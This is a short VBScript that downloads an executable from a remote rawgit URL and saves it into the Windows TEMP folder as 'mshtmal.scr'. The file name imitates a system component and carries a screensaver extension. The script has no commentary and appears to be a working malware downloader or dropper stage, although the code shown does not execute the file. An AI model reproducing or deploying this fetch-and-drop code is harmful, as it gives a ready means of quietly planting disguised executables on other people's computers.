dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://cdn.rawgit.com/kres0345/Downloads-With-PS1/4cf33ff2/nanoc.exe", False

xHttp.Send

Set environmentVars = WScript.CreateObject("WScript.Shell").Environment("Process")
tempFolder = environmentVars("TEMP")

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile (tempFolder & "\mshtmal.scr"), 2 '//overwrite
end with